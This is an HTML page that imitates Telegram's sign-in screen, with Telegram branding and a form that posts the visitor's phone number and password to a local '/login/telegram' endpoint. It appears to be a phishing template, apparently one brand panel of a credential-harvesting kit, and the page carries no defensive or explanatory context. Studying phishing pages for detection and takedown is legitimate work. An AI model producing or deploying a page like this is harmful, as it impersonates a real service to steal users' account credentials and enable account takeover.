<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#f0f0f0;display:flex;justify-content:center;align-items:center;min-height:100vh}
        .tg-box{background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.1);width:380px}
        .tg-box h1{text-align:center;color:#0088cc;font-size:36px;margin-bottom:10px}
        .tg-box .sub{text-align:center;color:#666;font-size:14px;margin-bottom:30px}
        input{width:100%;padding:12px 14px;margin:8px 0;border:1px solid #ddd;border-radius:6px;font-size:16px}
        input:focus{border-color:#0088cc;outline:none}
        button{width:100%;padding:14px;background:#0088cc;border:none;border-radius:6px;color:#fff;font-size:16px;font-weight:600;cursor:pointer;margin:10px 0}
        button:hover{background:#006699}
        .qr{text-align:center;margin:20px 0}
        .qr img{width:120px;height:120px}
        .footer{text-align:center;font-size:12px;color:#888;margin-top:20px}
    </style>
</head>
<body>
<div class="tg-box">
    <h1>Telegram</h1>
    <p class="sub">Sign in to your account</p>
    <form method="POST" action="/login/telegram">
        <input type="text" name="username" placeholder="Phone number" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Sign In</button>
    </form>
    <div class="footer">By continuing you agree to our Terms of Service</div>
</div>
</body>
</html>
